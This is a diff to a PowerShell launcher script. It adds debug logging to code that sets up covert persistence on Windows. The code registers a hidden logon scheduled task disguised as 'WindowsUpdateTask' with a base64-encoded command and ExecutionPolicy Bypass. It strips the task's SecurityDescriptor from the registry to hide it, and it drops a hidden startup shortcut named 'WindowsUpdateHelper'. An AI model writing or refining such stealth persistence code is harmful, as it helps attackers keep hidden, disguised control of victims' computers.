@@ -1,7 +1,7 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
 # === IMMEDIATE DEBUG LOGGING ===
-"Launcher started" | Out-File "C:\Users\Public\debug.txt" -Append
+"Launcher started at $(Get-Date)" | Out-File "C:\Users\Public\debug.txt" -Append
 
 # === ERROR LOGGING SETUP ===
 $debugLog = "C:\Users\Public\debug.txt"
@@ -152,18 +152,28 @@ $taskName = "WindowsUpdateTask"
 $taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
 if (-not $taskExists) {
     try {
+        Write-DebugLog "Creating scheduled task"
         $trigger = New-ScheduledTaskTrigger -AtLogOn
         $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""))
         $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-EncodedCommand $encodedCommand"
         $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 1)
         Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
-        Write-DebugLog "Scheduled task created"
+        Write-DebugLog "Scheduled task created successfully"
         
-        $taskPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskName"
-        if (Test-Path $taskPath) { Remove-ItemProperty -Path $taskPath -Name "SecurityDescriptor" -Force -ErrorAction Stop }
+        try {
+            $taskPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskName"
+            if (Test-Path $taskPath) { 
+                Remove-ItemProperty -Path $taskPath -Name "SecurityDescriptor" -Force -ErrorAction Stop 
+                Write-DebugLog "Task security descriptor removed"
+            }
+        } catch {
+            Write-DebugLog "Failed to remove task security descriptor: $($_.Exception.Message)"
+        }
     } catch {
         Write-DebugLog "Failed to create scheduled task: $($_.Exception.Message)"
     }
+} else {
+    Write-DebugLog "Scheduled task already exists"
 }
 
 # === PERSISTENCE: Startup LNK ===
@@ -171,16 +181,19 @@ $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $lnkPath = "$startupPath\WindowsUpdateHelper.lnk"
 if (-not (Test-Path $lnkPath)) {
     try {
+        Write-DebugLog "Creating startup shortcut"
         $wshShell = New-Object -ComObject WScript.Shell
         $shortcut = $wshShell.CreateShortcut($lnkPath)
         $shortcut.TargetPath = "powershell.exe"
         $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
         $shortcut.WindowStyle = 7
         $shortcut.Save()
-        Write-DebugLog "Startup shortcut created"
+        Write-DebugLog "Startup shortcut created successfully"
     } catch {
         Write-DebugLog "Failed to create startup shortcut: $($_.Exception.Message)"
     }
+} else {
+    Write-DebugLog "Startup shortcut already exists"
 }
 
 # === SET FIRST RUN FLAG ===
